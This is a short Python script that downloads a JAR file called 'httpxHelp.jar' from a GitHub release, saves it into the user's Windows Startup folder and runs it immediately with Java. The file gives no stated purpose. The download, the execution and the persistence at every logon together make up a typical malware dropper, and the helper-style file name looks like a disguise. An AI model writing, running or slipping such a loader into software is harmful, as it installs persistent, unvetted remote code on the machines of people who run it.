import urllib.request
import subprocess
import os




url = "https://github.com/ApfelsaftDevs/test12345/releases/download/1.0/httpxHelp.jar"
filename = "httpxHelp.jar"
startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
filepath = os.path.join(startup_path, filename)
response = urllib.request.urlopen(url)
with open(filepath, 'wb') as out_file:
    data = response.read()
    out_file.write(data)
subprocess.call(["java", "-jar", filepath], cwd=startup_path)

